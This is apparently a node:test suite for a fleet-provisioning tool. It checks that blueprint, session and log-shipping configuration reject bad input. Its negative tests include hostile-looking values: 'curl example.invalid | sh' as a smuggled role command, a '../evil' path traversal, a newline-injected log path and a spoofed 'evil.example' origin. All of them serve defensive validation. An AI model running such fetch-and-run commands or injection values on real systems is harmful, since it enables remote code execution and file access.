import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  APP_URL, ROUTES, validateBlueprint, validateEnvironment, migrateBlueprintV1ToV2,
  resolveMachinePackages, exportMarkdown, importMarkdown, blueprintDigest,
  aidProviderConfig, chooseRoute, newSession, transitionSession, CastWriter,
  planLokiIntegration, renderAlloy
} from '../dist/core.js';
import { readFileSync } from 'node:fs';

// Synthetic fixture; the zero commit is not a claim that skills were fetched or verified.
const fixture = () => ({
  schemaVersion: 1, revision: 'r1', appUrl: APP_URL,
  routing: { engine: 'projectsites', preferredProvider: 'deepseek', allowPremium: false, maxTaskCostMicros: 250000 },
  skills: { repository: 'heymegabyte/agent-skills', commit: '0'.repeat(40), include: ['desktop-provisioning'] },
  defaults: { packages: ['git', 'chezmoi', 'mise'], shellHistory: 'hishtory' },
  machines: [
    { id: 'runner', os: 'linux', role: 'runner', packages: ['alloy'] },
    { id: 'laptop', os: 'darwin', role: 'workstation', packages: [] }
  ],
  services: [{ id: 'logs', kind: 'loki', pushUrl: 'https://logs.example.invalid/loki/api/v1/push', credentialRef: 'infisical://fleet/loki', machineIds: ['runner', 'laptop'] }],
  privacy: { shellAnalysis: 'local', screenshots: 'off', terminalInput: false, productLearning: false }
});
const session = () => newSession('session-1', 'tenant-1', 'runner', 'owner', 'r1', '2026-10-26T13:31:00.000Z');
const now = '2026-10-26T13:32:00.000Z';
const migrationFixture = name => JSON.parse(readFileSync(new URL(`./fixtures/${name}.json`, import.meta.url), 'utf8'));
function cast() { const lines = []; const writer = new CastWriter(line => lines.push(JSON.parse(line)), 80, 24, 1793021460); return { lines, writer }; }

test('blueprint validates and returns an independent copy', () => { const b = fixture(); const v = validateBlueprint(b); v.defaults.packages.push('jq'); assert.equal(b.defaults.packages.length, 3); });
test('markdown round trip preserves all declared v1 settings', () => assert.deepEqual(importMarkdown(exportMarkdown(fixture())), fixture()));
test('CRLF markdown is accepted', () => assert.deepEqual(importMarkdown(exportMarkdown(fixture()).replaceAll('\n', '\r\n')), fixture()));
test('unknown fields cannot be silently exported or treated as settings', () => assert.throws(() => exportMarkdown({ ...fixture(), apiKey: 'secret' }), /unknown/));
test('wrong app origin is rejected', () => { const b = fixture(); b.appUrl = 'https://evil.example'; assert.throws(() => validateBlueprint(b)); });
test('unsupported schema rejected', () => { const b = fixture(); b.schemaVersion = 2; assert.throws(() => validateBlueprint(b)); });
test('Atuin cannot be reintroduced by an old blueprint', () => { const b = fixture(); b.defaults.shellHistory = 'atuin'; assert.throws(() => validateBlueprint(b), /hiSHtory/); });
test('skills must pin a full immutable commit', () => { const b = fixture(); b.skills.commit = 'main'; assert.throws(() => validateBlueprint(b), /commit/); });
test('duplicate machine identities rejected', () => { const b = fixture(); b.machines.push(b.machines[0]); assert.throws(() => validateBlueprint(b), /duplicates/); });
test('unknown service target rejected', () => { const b = fixture(); b.services[0].machineIds.push('unknown'); assert.throws(() => validateBlueprint(b), /unknown machine/); });
test('duplicate packages rejected', () => { const b = fixture(); b.defaults.packages.push('git'); assert.throws(() => validateBlueprint(b), /duplicates/); });
test('embedded endpoint credentials rejected', () => { const b = fixture(); b.services[0].pushUrl = 'https://user:password@logs.example'; assert.throws(() => validateBlueprint(b), /credentials/); });
test('query-string secrets rejected', () => { const b = fixture(); b.services[0].pushUrl += '?token=secret'; assert.throws(() => validateBlueprint(b)); });
test('plain HTTP is rejected', () => { const b = fixture(); b.services[0].pushUrl = 'http://logs.example'; assert.throws(() => validateBlueprint(b)); });
test('inline secret value cannot replace a credential reference', () => { const b = fixture(); b.services[0].credentialRef = 'password123'; assert.throws(() => validateBlueprint(b), /reference/); });
test('raw input recording is prohibited by v1 policy', () => { const b = fixture(); b.privacy.terminalInput = true; assert.throws(() => validateBlueprint(b)); });
test('negative AI budgets rejected', () => { const b = fixture(); b.routing.maxTaskCostMicros = -1; assert.throws(() => validateBlueprint(b)); });
test('multiple canonical blocks rejected', () => assert.throws(() => importMarkdown(exportMarkdown(fixture()).repeat(2)), /exactly one/));
test('missing canonical block rejected', () => assert.throws(() => importMarkdown('# Hello'), /exactly one/));
test('malformed JSON rejected', () => assert.throws(() => importMarkdown('```install-doctor+json\n{bad}\n```')));
test('oversized document rejected', () => assert.throws(() => importMarkdown('x'.repeat(2000001)), /too large/));
test('digest ignores object key order', async () => { const b = fixture(); const reordered = Object.fromEntries(Object.entries(b).reverse()); assert.equal(await blueprintDigest(b), await blueprintDigest(reordered)); });
test('digest changes with desired state', async () => { const b = fixture(); const original = await blueprintDigest(b); b.revision = 'r2'; assert.notEqual(original, await blueprintDigest(b)); });
test('provider uses only Install Doctor and an environment token reference', () => { const c = aidProviderConfig(); assert.equal(c.provider['install-doctor'].options.apiKey, '{env:AID_INFERENCE_TOKEN}'); assert.equal(c.provider['install-doctor'].options.baseURL, APP_URL + '/api/ai/v1'); assert.deepEqual(c.enabled_providers, ['install-doctor']); assert.equal(Object.keys(c.provider['install-doctor'].models).length, ROUTES.length); });
test('routine requests choose economy', () => assert.equal(chooseRoute({ sensitivity: 'normal', kind: 'routine', verificationFailed: false }, false), 'economy'));
test('restricted wins over premium escalation', () => assert.equal(chooseRoute({ sensitivity: 'restricted', kind: 'code', verificationFailed: true }, true), 'restricted'));
test('premium is never selected without policy permission', () => assert.equal(chooseRoute({ sensitivity: 'normal', kind: 'architecture', verificationFailed: true }, false), 'code'));
test('verified failure may escalate with policy permission', () => assert.equal(chooseRoute({ sensitivity: 'normal', kind: 'code', verificationFailed: true }, true), 'critical'));
test('session starts with a tenant-scoped recording key', () => { const s = session(); assert.equal(s.status, 'created'); assert.equal(s.recordingKey, 'recordings/tenant-1/runner/session-1.cast'); });
test('metadata rejects path traversal', () => assert.throws(() => newSession('../evil', 't', 'm', 'a', 'r1', now)));
test('session lifecycle supports verified success', () => { const s = transitionSession(session(), 'running', now); const done = transitionSession(s, 'succeeded', now, 0); assert.equal(done.status, 'succeeded'); assert.equal(done.finishedAt, now); });
test('success before spawn is rejected', () => assert.throws(() => transitionSession(session(), 'succeeded', now, 0)));
test('success without exit code zero rejected', () => assert.throws(() => transitionSession(transitionSession(session(), 'running', now), 'succeeded', now)));
test('final session cannot resume through a new lifecycle transition', () => { const s = transitionSession(session(), 'cancelled', now); assert.throws(() => transitionSession(s, 'running', now)); });
test('process creation failure still has a history record', () => assert.equal(transitionSession(session(), 'failed', now).recordingKey, session().recordingKey));
test('pre-creation timestamps rejected', () => assert.throws(() => transitionSession(session(), 'running', '2025-01-01T00:00:00Z')));
test('asciicast v3 has relative intervals and output/resize/exit', () => { const { lines, writer } = cast(); writer.output(1, 'hello'); writer.resize(3, 100, 30); writer.finish(4, 0); assert.equal(lines[0].version, 3); assert.deepEqual(lines[1], [1, 'o', 'hello']); assert.deepEqual(lines[2], [2, 'r', '100x30']); assert.deepEqual(lines[3], [1, 'x', '0']); });
test('recording API does not offer raw keyboard input capture', () => { const { writer } = cast(); assert.equal(writer.input, undefined); });
test('recording rejects backward timestamps', () => { const { writer } = cast(); writer.output(2, 'hello'); assert.throws(() => writer.output(1, 'old')); });
test('recording rejects appends after exit', () => { const { writer } = cast(); writer.finish(1, 0); assert.throws(() => writer.output(2, 'late')); });
test('recording rejects invalid geometry', () => assert.throws(() => new CastWriter(() => {}, 0, 24, 1)));
test('recording propagates storage errors rather than claiming success', () => { const bad = new CastWriter(line => { if (line.startsWith('[')) throw new Error('disk full'); }, 80, 24, 1); assert.throws(() => bad.output(1, 'hello'), /disk full/); });
test('Loki fan-out includes each explicitly selected machine once', () => { const plans = planLokiIntegration(fixture(), 'logs', 'event-1'); assert.deepEqual(plans.map(p => p.machineId), ['runner', 'laptop']); assert.equal(new Set(plans.map(p => p.idempotencyKey)).size, 2); });
test('duplicate event gets stable deduplication keys', () => assert.deepEqual(planLokiIntegration(fixture(), 'logs', 'event-1'), planLokiIntegration(fixture(), 'logs', 'event-1')));
test('revision changes reconciliation key', () => { const b = fixture(); const old = planLokiIntegration(b, 'logs', 'event-1')[0].idempotencyKey; b.revision = 'r2'; assert.notEqual(old, planLokiIntegration(b, 'logs', 'event-1')[0].idempotencyKey); });
test('unknown integration rejected', () => assert.throws(() => planLokiIntegration(fixture(), 'missing', 'event-1')));
test('Alloy fragment uses scoped secret references and exact event path', () => { const text = renderAlloy(fixture(), 'logs', 'runner', '/var/log/aid/events.ndjson'); assert.match(text, /loki\.write/); assert.match(text, /AID_LOKI_PASSWORD/); assert.match(text, /machine_id/); assert.doesNotMatch(text, /promtail/i); });
test('unselected machine cannot receive service config', () => assert.throws(() => renderAlloy(fixture(), 'logs', 'unknown', '/var/log/aid/events.ndjson')));
test('wildcard paths cannot capture unrelated logs', () => assert.throws(() => renderAlloy(fixture(), 'logs', 'runner', '/var/log/*')));
test('multiline path injection rejected', () => assert.throws(() => renderAlloy(fixture(), 'logs', 'runner', '/var/log/x\nmalicious')));

test('coercible non-string OS cannot bypass validation', () => { const b = fixture(); b.machines[0].os = ['linux']; assert.throws(() => validateBlueprint(b)); });
test('coercible non-string capture policy cannot bypass validation', () => { const b = fixture(); b.privacy.screenshots = ['off']; assert.throws(() => validateBlueprint(b)); });

test('v2 role overlays resolve defaults, role packages, and machine additions deterministically', () => {
  const environment = migrationFixture('environment-v2');
  assert.deepEqual(resolveMachinePackages(environment, 'runner-a'), ['git', 'chezmoi', 'alloy', 'restic']);
  assert.deepEqual(resolveMachinePackages(environment, 'runner-b'), ['git', 'chezmoi', 'alloy', 'jq']);
});

test('v2 machine exceptions may remove inherited packages without mutating the role', () => {
  const environment = migrationFixture('environment-v2');
  environment.machines[0].packageOverrides.remove.push('chezmoi');
  assert.deepEqual(resolveMachinePackages(environment, 'runner-a'), ['git', 'alloy', 'restic']);
  assert.deepEqual(resolveMachinePackages(environment, 'runner-b'), ['git', 'chezmoi', 'alloy', 'jq']);
});

test('v2 rejects unknown roles and contradictory machine package exceptions', () => {
  const unknownRole = migrationFixture('environment-v2');
  unknownRole.machines[0].role = 'missing';
  assert.throws(() => validateEnvironment(unknownRole), /role/i);
  const contradictory = migrationFixture('environment-v2');
  contradictory.machines[0].packageOverrides.remove.push('restic');
  assert.throws(() => validateEnvironment(contradictory), /both|overlap/i);
});

test('v2 rejects removal of a package not inherited from defaults or the selected role', () => {
  const environment = migrationFixture('environment-v2');
  environment.machines[0].packageOverrides.remove.push('unknown-package');
  assert.throws(() => validateEnvironment(environment), /inherited/i);
});

test('explicit v1 to v2 migration matches the reviewed fixture and preserves effective packages', () => {
  const source = migrationFixture('environment-v1');
  const migrated = migrateBlueprintV1ToV2(source);
  assert.deepEqual(migrated, migrationFixture('environment-v2'));
  for (const machine of source.machines) {
    assert.deepEqual(resolveMachinePackages(migrated, machine.id), [...source.defaults.packages, ...machine.packages]);
  }
});

test('v1 remains valid and is never migrated implicitly during markdown import', () => {
  const source = migrationFixture('environment-v1');
  const imported = importMarkdown(exportMarkdown(source));
  assert.equal(imported.schemaVersion, 1);
  assert.deepEqual(imported, source);
});

test('v2 canonical markdown round trip and digest preserve the versioned desired state', async () => {
  const source = migrationFixture('environment-v2');
  const markdown = exportMarkdown(source);
  assert.deepEqual(importMarkdown(markdown), source);
  assert.equal(await blueprintDigest(source), await blueprintDigest(importMarkdown(markdown)));
});

test('v2 remains consumable by existing integration planners', () => {
  const environment = migrationFixture('environment-v2');
  assert.deepEqual(planLokiIntegration(environment, 'logs', 'event-v2').map(plan => plan.machineId), ['runner-a', 'runner-b', 'laptop']);
  assert.match(renderAlloy(environment, 'logs', 'runner-a', '/var/log/aid/events.ndjson'), /machine_id/);
});

test('v2 strict schema rejects unknown role and override fields', () => {
  const roleField = migrationFixture('environment-v2');
  roleField.roles[0].command = 'curl example.invalid | sh';
  assert.throws(() => validateEnvironment(roleField), /unrecognized|unknown/i);
  const overrideField = migrationFixture('environment-v2');
  overrideField.machines[0].packageOverrides.replace = ['evil'];
  assert.throws(() => validateEnvironment(overrideField), /unrecognized|unknown/i);
});
